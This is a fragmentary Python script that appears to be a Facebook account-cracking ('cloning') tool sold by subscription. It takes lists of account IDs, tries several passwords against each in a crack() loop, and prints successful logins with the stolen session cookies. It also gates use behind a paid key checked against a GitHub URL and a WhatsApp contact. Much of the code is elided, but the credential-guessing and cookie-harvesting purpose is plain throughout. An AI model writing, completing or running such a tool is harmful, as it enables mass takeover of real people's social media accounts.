...
try:
	...
	print('[[\x1b[1;92m+\x1b[1;97m] [\x1b[1;96mSABBIR')
...
#    username = input(' \033[0;92mEnter Username: ')
 ...
 #   if username == 'SABBIR' and password == 'Love':
...
os.system('espeak -a 300 " Welcome,   to,  SABBIR,  Raj,  Tools"')
...
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
\033[1;91m[*] CREATOR   > SABBI4
\033[1;91m[*] FACEBOOK  > SABBIR Islam 
\033[1;91m[*] GITHUB    > SABBI4
\033[1;91m[*] VERSION   > 0.1
\033[1;91m[*] WHATSAPP  > +8801304683013
\033[0;94m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\033[1;31m""")
def login():
	banner()
	SABBIRj('\033[1;96m[1] File Cloning\n\x1b[1;92m[2] Contact With Admin\n\033[0;97m[0] \033[0;91mEXIT ')
	SABBIRj('\033[0;97m===============================================')
	SABBIR= input('\x1b[1;92m[+] CHOOSE: ');time.sleep(0.01)
	if SABBIR in ['m']:
		public()
	elif SABBIR in ['1']:
		crack_file()
		...
		os.system('xdg-open https://wa.me/+8801304683013')
	elif SABBIR in ['0']:
...
def setting():
	...
	if hu in ['1','01']:
		...
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	print('\x1b[1;92m LOGIN RajY\n\x1b[1;97m [1] METHOD Raj ')
	os.system('espeak -a 300 " 1,  method,  Raj"')
	hc = input(' CHOOSE: ')
	if hc in ['1','01']:
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo}[SABBIR-XD] {P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}•{P}[{h}Ok{P}•{bo}{ok}{P}] "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				#SABBIR-VAI
				#print(f'\r\033[0;94m[{time.strftime("%H:%M")}•SABBIR-Cp] {idf} • {pw}')     
				...
				#SABBIR-VAI
				print(f'\r\033[0;92m[{time.strftime("%H:%M")}•SABBIR-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
				print('\033[0;94m==============================================================')
...
def Subscraption():
	...
	r1=requests.get("https://github.com/sabbirvai42/Approved.git").text
	if key1 in r1:
		os.system('clear')
		login()
	else:
		...
		time.sleep(0.0010)
		print("\033[97;1m[\033[92;1m•\033[97;1m]\x1b[38;5;208m SABBIR-VAI, ToOLs Daily Update")
		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m 7 DAYS 300 Tk")
		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m 15 DAYS 500 Tk")
		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m Your Key  :\033[0;93m "+ak+SABBIR+key1)
		...
		time.sleep(3.5)
		tks = 'Assalamu%20Alaikum-!💚,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+ak+SABBIR+''+key1
		os.system('am start https://wa.me/+8801304683013?text=' + tks)
		Subscraption() 
Subscraption() 
login()